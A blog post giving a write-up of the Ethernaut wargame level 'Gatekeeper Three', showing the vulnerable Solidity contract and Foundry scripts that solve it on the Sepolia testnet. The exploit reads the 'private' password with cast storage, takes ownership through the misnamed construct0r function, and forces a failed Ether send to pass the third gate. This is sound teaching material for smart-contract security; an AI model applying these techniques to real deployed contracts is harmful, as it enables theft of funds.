---
layout: post
title: "[Ethernaut] 28.Gatekeeper Three"
tags: blockchain ethernaut foundry
---

# Analysis

---

The goal is “Cope with gates and become an entrant.”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

# Exploit

---

First, execute the `createTrick()` function to deploy the SimpleTrick Contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "forge-std/Script.sol";

contract GateKeeperThreeSol is Script {
    GatekeeperThree public gkt_ = GatekeeperThree(payable(0xf28A40c7631dd62f68Abe745672426396D79Ac3f));

    function run() external {
	    vm.startBroadcast();

	    gkt_.createTrick();
	    console.log(address(gkt_.trick()));

      vm.stopBroadcast();
    }
}
```

Retrieve the password value using the `cast storage` command.

```bash
$ cast storage 0x090447a4055Fc87ACf4C9ff912b5Cb749b6fBFE4 2 --rpc-url sepolia
0x00000000000000000000000000000000000000000000000000000000696f3c48
```

Execute the following code to solve the challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "forge-std/Script.sol";

contract Ex {
    GatekeeperThree public gkt_ = GatekeeperThree(payable(0xf28A40c7631dd62f68Abe745672426396D79Ac3f));

    function ex() public {
        gkt_.construct0r();
        gkt_.getAllowance(uint256(0x00000000000000000000000000000000000000000000000000000000696f3c48));
        gkt_.enter();
    }

    receive() external payable {
        revert();
    }
}

contract GateKeeperThreeSol is Script {
    GatekeeperThree public gkt_ = GatekeeperThree(payable(0xf28A40c7631dd62f68Abe745672426396D79Ac3f));

    function run() external {
        vm.startBroadcast();

        payable(gkt_).send(0.002 ether);
        Ex ex = new Ex();
        ex.ex();
        console.log(gkt_.entrant());

        vm.stopBroadcast();
    }
}
```